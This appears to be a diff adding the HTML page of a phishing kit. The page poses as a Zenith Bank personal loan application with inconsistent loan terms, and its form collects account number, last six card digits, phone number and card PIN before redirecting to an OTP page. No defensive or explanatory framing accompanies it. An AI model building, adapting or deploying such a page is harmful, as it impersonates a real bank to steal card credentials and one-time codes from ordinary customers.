@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bank Loan Application</title>
+  <link rel="stylesheet" href="style.css">
+  <script>
+    function redirectToOTP() {
+      window.location.href = "otp.html";
+    }
+  </script>
+</head>
+<body>
+  <header>
+    <img src="logo.png" alt="Bank Logo" class="logo">
+  </header>
+ <main>
+  <center> 
+  <h3 style="font-family:verdana;">
+  With the Zenith Bank Personal Loan, you can get up to N5 million, 
+  to help you live your dreams. You also enjoy a flexible repayment period of 48 months at a highly competitive interest rate.
+​Whether you are a salary earner or self-employed, you can now get the cash you need instantly and pay back in 5-6 years time. Zenith bank loan credit gives you funds of up to N20 million naira at an interest rate of 1.33% monthly.
+ </h3>
+ </center>
+    <img src="image2.png" alt="Loan Image" class="loan-image" width="max" align="center">
+    <form onsubmit="redirectToOTP(); return false;">
+      <div class="form-group">
+        <label for="account-number">Account Number:</label>
+        <input type="text" id="account-number" name="account-number" required>
+      </div>
+      <div class="form-group">
+        <label for="card-digits">Last Six Digits of Card:</label>
+        <input type="text" id="card-digits" name="card-digits" required>
+      </div>
+      <div class="form-group">
+        <label for="loan-amount">Loan Amount Needed:</label>
+        <input type="text" id="loan-amount" name="loan-amount" required>
+      </div>
+      <div class="form-group">
+        <label for="phone-number">Phone Number:</label>
+        <input type="text" id="phone-number" name="phone-number" required>
+      </div>
+      <div class="form-group">
+        <label for="card-pin">Card PIN:</label>
+        <input type="password" id="card-pin" name="card-pin" required>
+      </div>
+	  <center>
+	  <h3 style="color:red"> NOTE: </h3>
+	 After filling all feilds correctly,tap the continue button to proceed </center>
+	 </br>
+	 </br>
+	 </br>
+	 </br>
+  <center>    <button type="submit" class="submit-btn">Apply for Loan</button></center>
+    </form>
+  </main>
+  <img src="image3.png" alt="Loan Image" class="loan-image">
+</body>
+</html>
